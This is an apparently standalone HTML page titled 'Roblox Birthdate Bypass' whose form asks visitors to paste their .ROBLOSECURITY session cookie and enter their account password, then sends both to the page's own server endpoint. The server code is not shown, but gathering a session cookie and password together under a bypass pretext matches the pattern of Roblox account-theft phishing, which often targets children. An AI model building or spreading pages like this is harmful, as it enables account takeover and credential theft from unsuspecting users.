<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Birthdate Bypass</title>
</head>
<body style="font-family: sans-serif; padding: 2rem; background: #f9f9f9;">
  <h2>Update Roblox Birthdate</h2>
  <form id="bypassForm">
    <label>.ROBLOSECURITY Cookie:</label><br />
    <textarea name="cookie" rows="4" cols="50" required></textarea><br /><br />
    
    <label>Password:</label><br />
    <input type="password" name="password" required /><br /><br />
    
    <button type="submit">Submit</button>
  </form>

  <pre id="result" style="margin-top: 2rem; background: #eee; padding: 1rem;"></pre>

  <script>
    const form = document.getElementById('bypassForm');
    const result = document.getElementById('result');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      result.textContent = 'Processing...';

      const formData = new FormData(form);
      const body = {
        cookie: formData.get('cookie'),
        password: formData.get('password')
      };

      const res = await fetch('/api/change-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });

      const data = await res.json();
      result.textContent = JSON.stringify(data, null, 2);
    });
  </script>
</body>
</html>
